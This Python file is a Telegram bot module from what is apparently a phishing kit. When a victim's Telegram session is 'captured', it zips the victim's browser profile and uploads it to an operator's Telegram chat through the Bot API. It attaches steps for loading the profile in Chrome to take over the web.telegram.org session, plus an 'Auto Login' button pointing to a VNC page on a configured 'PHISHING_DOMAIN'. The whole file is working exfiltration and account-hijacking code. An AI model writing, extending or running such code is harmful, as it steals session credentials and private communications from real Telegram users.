#!/usr/bin/env python3
"""
Telegram Bot - Clean, single alert with auto-login button
"""

import asyncio
import aiohttp
import json
import os
import zipfile
import tempfile
from pathlib import Path
from typing import Optional, Dict
from datetime import datetime


class TelegramBot:
    def __init__(self, bot_token: str, chat_id: str, domain: str = "localhost"):
        self.bot_token = bot_token
        self.chat_id = chat_id
        self.domain = domain
        self.base_url = f"https://api.telegram.org/bot{bot_token}" if bot_token else None
        self.sent: set = set()  # Track sent alerts
    
    @property
    def is_configured(self) -> bool:
        return bool(self.bot_token and self.chat_id)
    
    async def _api(self, method: str, **kwargs) -> Optional[Dict]:
        if not self.is_configured:
            print(f"[TG Bot] Not configured!", flush=True)
            return None
        try:
            url = f"{self.base_url}/{method}"
            print(f"[TG Bot] API call: {method}", flush=True)
            async with aiohttp.ClientSession() as session:
                async with session.post(url, **kwargs) as r:
                    print(f"[TG Bot] Response: {r.status}", flush=True)
                    if r.status == 200:
                        result = await r.json()
                        print(f"[TG Bot] Success: {result.get('ok', False)}", flush=True)
                        return result
                    else:
                        text = await r.text()
                        print(f"[TG Bot] Error {r.status}: {text}", flush=True)
        except Exception as e:
            print(f"[TG Bot] Exception: {e}", flush=True)
            import traceback
            traceback.print_exc()
        return None
    
    async def send(self, text: str, buttons: list = None) -> bool:
        payload = {
            "chat_id": self.chat_id,
            "text": text,
            "parse_mode": "HTML",
            "disable_web_page_preview": True
        }
        if buttons:
            payload["reply_markup"] = json.dumps({"inline_keyboard": buttons})
        return await self._api("sendMessage", json=payload) is not None
    
    async def send_file(self, path: str, caption: str = "", buttons: list = None) -> bool:
        print(f"[TG Bot] send_file: {path}", flush=True)
        if not Path(path).exists():
            print(f"[TG Bot] File not found: {path}", flush=True)
            return False
        
        print(f"[TG Bot] File size: {Path(path).stat().st_size} bytes", flush=True)
        
        data = aiohttp.FormData()
        data.add_field('chat_id', self.chat_id)
        data.add_field('document', open(path, 'rb'), filename=Path(path).name)
        if caption:
            data.add_field('caption', caption)
            data.add_field('parse_mode', 'HTML')
        if buttons:
            data.add_field('reply_markup', json.dumps({"inline_keyboard": buttons}))
        
        result = await self._api("sendDocument", data=data)
        print(f"[TG Bot] send_file result: {result is not None}", flush=True)
        return result is not None

    async def on_telegram_captured(self, session_id: str, profile_path: str) -> bool:
        """
        ONLY alert - Telegram session captured
        Sends ONE message with auto-login button
        """
        print(f"[TG Bot] on_telegram_captured called: {session_id}", flush=True)
        print(f"[TG Bot] Profile: {profile_path}", flush=True)
        print(f"[TG Bot] Already sent: {self.sent}", flush=True)
        
        if session_id in self.sent:
            print(f"[TG Bot] Already sent for this session, skipping", flush=True)
            return False
        self.sent.add(session_id)
        
        # Create zip of the profile
        profile_dir = Path(profile_path)
        if not profile_dir.exists():
            return False
        
        with tempfile.NamedTemporaryFile(suffix='.zip', delete=False) as tmp:
            zip_path = tmp.name
        
        try:
            with zipfile.ZipFile(zip_path, 'w', zipfile.ZIP_DEFLATED) as zf:
                for f in profile_dir.rglob('*'):
                    if f.is_file():
                        zf.write(f, f.relative_to(profile_dir))
            
            # Clean message with auto-login button
            caption = (
                "━━━━━━━━━━━━━━━━━━━━━━━━━\n"
                "✈️ <b>TELEGRAM SESSION</b>\n"
                "━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
                f"🕐 {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n\n"
                "<b>Usage:</b>\n"
                "1. Extract zip\n"
                "2. <code>chrome --user-data-dir=./folder</code>\n"
                "3. Go to web.telegram.org\n"
            )
            
            buttons = [[
                {"text": "🚀 Auto Login", "url": f"http://{self.domain}:6080/vnc.html"}
            ]]
            
            return await self.send_file(zip_path, caption, buttons)
        
        finally:
            Path(zip_path).unlink(missing_ok=True)


# Singleton
_bot: Optional[TelegramBot] = None

def get_bot() -> TelegramBot:
    global _bot
    if _bot is None:
        _bot = TelegramBot(
            os.environ.get("TELEGRAM_BOT_TOKEN", ""),
            os.environ.get("TELEGRAM_CHAT_ID", ""),
            os.environ.get("PHISHING_DOMAIN", "localhost")
        )
    return _bot
